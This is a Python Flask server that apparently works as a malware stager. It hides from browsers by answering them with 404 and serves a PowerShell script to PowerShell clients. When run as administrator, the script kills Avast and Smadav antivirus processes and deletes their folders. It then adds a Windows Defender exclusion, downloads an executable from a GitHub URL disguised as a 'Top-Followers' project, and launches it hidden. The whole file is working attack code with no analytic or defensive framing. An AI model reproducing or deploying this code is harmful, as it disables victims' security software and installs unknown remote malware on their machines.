from flask import Flask, Response, request
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404, mimetype='text/plain')

    ps_content = """
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
    
    # 1. Kill stubborn processes
    $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
    foreach ($p in $procs) {
        taskkill /F /IM "$p.exe" /T /Device 2>$null
    }

    # 2. Cleanup Folders
    $folders = @("C:\\Program Files\\Avast Software", "C:\\Program Files (x86)\\SMADAV", "C:\\Program Files\\SMADAV")
    foreach ($f in $folders) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    # 3. Deployment (No new window to avoid 'Access Denied')
    $path = "$HOME\\client_10.exe"
    
    # Silently add exclusion
    Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

    Write-Host "[+] Fetching components..." -ForegroundColor Cyan
    try {
        if (!(Test-Path $path)) {
            $web = New-Object System.Net.WebClient
            $web.DownloadFile("https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe", $path)
        }
        
        if (Test-Path $path) {
            Write-Host "[+] ExE..." -ForegroundColor Green
            Start-Process $path -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {
        Write-Host "[!] Error during fetch: $_" -ForegroundColor Red
    }
    
} else {
    Write-Host "--- ERROR: MUST RUN AS ADMIN ---" -ForegroundColor Red
}
"""
    return Response(ps_content, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
